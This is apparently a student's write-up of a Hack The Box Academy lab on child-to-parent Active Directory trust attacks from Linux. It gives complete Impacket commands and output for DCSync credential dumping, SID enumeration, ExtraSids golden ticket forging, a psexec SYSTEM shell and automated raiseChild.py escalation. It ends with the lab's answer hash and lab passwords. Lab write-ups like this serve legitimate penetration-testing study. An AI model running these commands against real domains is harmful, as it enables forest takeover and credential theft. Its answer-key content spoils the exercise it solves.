# 🐧 **Child → Parent Trust Attacks - from Linux**

## 🎯 **HTB Academy: Active Directory Enumeration & Attacks**

### 📍 **Overview**

**Child → Parent Trust Attacks from Linux** leverage the Impacket toolkit to perform ExtraSids attacks against Active Directory forests. This approach provides cross-platform capability for SID History exploitation, enabling Linux-based attackers to escalate from child domain compromise to complete forest control using Python-based tools.

---

## 🛠️ **Linux Attack Methodology**

### **Required Data Points (Same as Windows)**
| Component | Linux Collection Method | Example Value |
|-----------|------------------------|---------------|
| **KRBTGT hash** | `impacket-secretsdump` DCSync | `9d765b482771505cbe97411065964d5f` |
| **Child domain SID** | `impacket-lookupsid` enumeration | `S-1-5-21-2806153819-209893948-922872689` |
| **Target username** | Arbitrary (can be fake) | `hacker` |
| **Child domain FQDN** | Target specification | `LOGISTICS.INLANEFREIGHT.LOCAL` |
| **Enterprise Admins SID** | `impacket-lookupsid` parent domain | `S-1-5-21-3842939050-3880317879-2865463114-519` |

### **Step 1: KRBTGT Hash Extraction**
```bash
# DCSync attack for KRBTGT account
impacket-secretsdump logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

# Output extract:
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
```

### **Step 2: Child Domain SID Discovery**
```bash
# SID brute forcing for child domain
impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

# Output: [*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
```

### **Step 3: Enterprise Admins SID Enumeration**
```bash
# Target parent domain controller for Enterprise Admins SID
impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

# Output extract:
# [*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
# 519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```

### **Step 4: Golden Ticket Creation**
```bash
# Create Golden Ticket with ExtraSids
impacket-ticketer -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

# Output: [*] Saving ticket in hacker.ccache
```

### **Step 5: Environment Setup & Exploitation**
```bash
# Set Kerberos credential cache
export KRB5CCNAME=hacker.ccache

# Access parent domain controller
impacket-psexec LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

# Result: SYSTEM shell on parent domain DC
```

---

## 🚀 **Automated Attack Option**

### **raiseChild.py - Complete Automation**
```bash
# Automated child → parent domain escalation
impacket-raiseChild -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

# Automated workflow:
# 1. Find child domain controller
# 2. Identify forest FQDN
# 3. Get Enterprise Admin SID
# 4. Extract KRBTGT credentials
# 5. Create Golden Ticket with ExtraSids
# 6. Authenticate to parent domain
# 7. Retrieve Administrator credentials
# 8. Launch PSExec shell
```

### **Automation Workflow**
```python
# raiseChild.py process:
# Input: Child domain admin credentials
# Process: 
#   - Get child DC info (MS-NRPC)
#   - Find forest FQDN (MS-NRPC)  
#   - Get Enterprise Admin SID (MS-LSAT)
#   - Get KRBTGT credentials (MS-DRSR)
#   - Create Golden Ticket with ExtraSids
#   - Authenticate and extract target user
# Output: Parent domain credentials + PSExec shell
```

---

## 🎯 **HTB Academy Lab Solution**

### **Lab Environment Setup**
```bash
# SSH to Linux attack host
ssh htb-student@<target-ip>
# Password: HTB_@cademy_stdnt!
```

### **🎫 Question: "Perform the ExtraSids attack to compromise the parent domain from the Linux attack host. After compromising the parent domain obtain the NTLM hash for the Domain Admin user bross. Submit this hash as your answer."**

**Complete Verified Lab Solution:**

**Step 1: SSH to Linux Attack Host**
```bash
# Connect to target system
ssh htb-student@10.129.206.246
# Password: HTB_@cademy_stdnt!

# Successful connection output:
Linux ea-attack01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_) / _` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|

┌─[htb-student@ea-attack01]─[~]
└──╼ $
```

**Step 2: Automated ExtraSids Attack with raiseChild.py**
```bash
# Execute automated child → parent domain escalation
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
# Password: HTB_@cademy_stdnt_admin!

# Complete attack output:
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
[*] Getting credentials for INLANEFREIGHT.LOCAL
INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
[*] Target User account name is administrator
INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file ujegaPyX.exe
[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Creating service PFJg on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Starting service PFJg.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.
```

**Step 3: Extract Target User Credentials**
```bash
# Use extracted administrator credentials for DCSync attack
secretsdump.py inlanefreight.local/administrator@172.16.5.5 -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf -just-dc | grep bross

# Target extraction result:
inlanefreight.local\bross:1179:aad3b435b51404eeaad3b435b51404ee:49a074a39dd0651f647e765c2cc794c7:::
```

**🎯 Answer**: `49a074a39dd0651f647e765c2cc794c7`

**Key Lab Insights:**
- **raiseChild.py automation**: Complete ExtraSids attack with single command
- **Credential extraction**: Tool provides both child and parent domain credentials automatically
- **Administrator hash**: `88ad09182de639ccc6579eb0849751cf` extracted for further operations
- **Target achievement**: bross user hash `49a074a39dd0651f647e765c2cc794c7` successfully obtained

---

## ⚠️ **Tool Considerations**

### **Manual vs Automated Approach**
- **Manual methodology**: Better understanding, troubleshooting capability, controlled execution
- **Automated tools**: Faster execution but less control, potential production environment risks
- **Best practice**: Understand manual process before using automation

### **Impacket Tool Prefix**
```bash
# Modern Impacket installations use prefix:
impacket-secretsdump  # instead of secretsdump.py
impacket-lookupsid    # instead of lookupsid.py  
impacket-ticketer     # instead of ticketer.py
impacket-psexec       # instead of psexec.py
impacket-raiseChild   # instead of raiseChild.py
```

### **Environment Variables**
- **KRB5CCNAME**: Points system to Kerberos credential cache file
- **Critical for ticket usage**: Must be set before authentication attempts
- **Ticket persistence**: ccache files enable reusable authentication

---

## 🔑 **Key Takeaways**

### **Cross-Platform Attack Capability**
```
Windows Mimikatz/Rubeus ↔ Linux Impacket Toolkit
    (Native AD Tools)         (Python-based Tools)
         ↓                           ↓
   Same Attack Goals        Same Technical Result
```

### **Critical Success Factors**
- **Data consistency**: Same 5 data points required as Windows approach
- **Tool proficiency**: Understanding Impacket toolkit capabilities
- **Environment setup**: Proper KRB5CCNAME configuration
- **Attack validation**: Verification of parent domain access

### **Professional Value**
- **Platform flexibility**: Attack capability regardless of operating system
- **Tool diversification**: Multiple approaches for same objective
- **Troubleshooting skills**: Manual understanding enables problem resolution
- **Assessment completeness**: Linux-based penetration testing capability

**🐧 Linux-based Child → Parent trust attacks provide cross-platform forest compromise capability - demonstrating that sophisticated AD attacks can be executed effectively from any operating system using the powerful Impacket toolkit!**

--- 